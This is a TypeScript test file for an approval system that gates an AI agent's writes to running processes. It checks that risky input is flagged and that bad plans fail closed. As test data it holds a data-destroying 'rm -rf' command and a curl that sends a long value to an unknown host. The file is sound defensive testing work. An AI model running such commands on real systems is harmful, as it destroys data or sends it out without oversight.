import { describe, expect, it, vi } from 'vitest';
import type { TaskRecord } from '@athanor/data';
import type { ModelToolCall } from '@athanor/model-gateway';
import type { AgentRunnerClient } from './runner-client.js';
import { processInputApproval } from './process-input-approval.js';
import { callDestinations } from './command-classification.js';
import { approvalRequirement } from './approval-policy.js';
import { approvalPreviewHash } from './approval-state.js';

const task = { id: 'task-a', workspaceId: 'project-a', securityMode: 'autonomous' } as TaskRecord;
const generation = 'b487edcb-745a-4c9b-a8db-88fcdb38bf5f';
function fixture(invocation: Record<string, unknown>, data: string) {
  const request = vi.fn(async () => ({
    invocation,
    inputRevision: 3,
    inputGeneration: generation
  }));
  const runner = { call: request } as unknown as AgentRunnerClient;
  const call: ModelToolCall = {
    id: 'input-1',
    name: 'process',
    arguments: {
      action: 'write',
      sessionId: 'proc/one',
      data,
      options: { inputRevision: 9000, inputDestinations: ['https://forged.invalid'] }
    }
  };
  return { runner, call, request };
}
describe('process input approval', () => {
  it('uses the stored executable and complete input, with no approval for ordinary autonomous input', async () => {
    const f = fixture({ executable: 'bash', stdin: 'printf hello\n' }, 'hello\n');
    expect(await processInputApproval(f.runner, task, f.call, {})).toBeNull();
    expect(f.request).toHaveBeenCalledWith(
      'project-a',
      'task-a',
      'exec',
      '/v1/workspaces/project-a/processes/proc%2Fone/input-plan',
      { data: 'hello\n' }
    );
    expect(f.call.arguments.options).toEqual({
      inputRevision: 3,
      inputGeneration: generation,
      inputDestinations: []
    });
    expect(
      await processInputApproval(f.runner, { ...task, securityMode: 'review' }, f.call, {})
    ).not.toBeNull();
  });
  it('detects a destructive script split between writes', async () => {
    const f = fixture({ executable: 'bash', stdin: 'rm -rf /outside/data\n' }, '/outside/data\n');
    const requirement = await processInputApproval(f.runner, task, f.call, {});
    expect(requirement).toMatchObject({ sideEffect: 'external_consequential' });
    expect(requirement?.action).toMatch(/^Process input:/);
    expect(requirement).not.toHaveProperty('taskGrant');
    const first = approvalPreviewHash(Buffer.alloc(32), 'process', f.call.arguments);
    (f.call.arguments.options as Record<string, unknown>).inputGeneration =
      '28c516dd-9184-4e32-82f5-9e22d52f8655';
    expect(approvalPreviewHash(Buffer.alloc(32), 'process', f.call.arguments)).not.toBe(first);
  });
  it('charges a destination completed across input chunks and preserves the provenance floor', async () => {
    const url = 'https://unknown.invalid/?value=' + 'x'.repeat(5000);
    const f = fixture(
      { executable: 'bash', stdin: 'curl ' + url + '\n', network: true },
      'x'.repeat(5000) + '\n'
    );
    expect(
      await processInputApproval(f.runner, task, f.call, { taintSources: ['web page'] })
    ).toMatchObject({ sideEffect: 'external_reversible' });
    expect(callDestinations('process', f.call.arguments)).toContain(url);
    expect(
      callDestinations('process', { action: 'poll', options: f.call.arguments.options })
    ).toEqual([]);
  });
  it('never treats an unresolved write as a read-only process action', () => {
    expect(
      approvalRequirement('process', { action: 'write', data: 'anything' }, 'autonomous')
    ).not.toBeNull();
  });
  it('fails closed if the input plan is absent or malformed', async () => {
    const f = fixture({ executable: 'bash', stdin: 'hello' }, 'hello');
    f.request.mockRejectedValueOnce(new Error('Running process not found'));
    await expect(processInputApproval(f.runner, task, f.call, {})).rejects.toThrow('not found');
    f.request.mockResolvedValueOnce({
      invocation: {},
      inputRevision: -1,
      inputGeneration: generation
    });
    await expect(processInputApproval(f.runner, task, f.call, {})).rejects.toThrow(
      'invalid input revision'
    );
  });
});
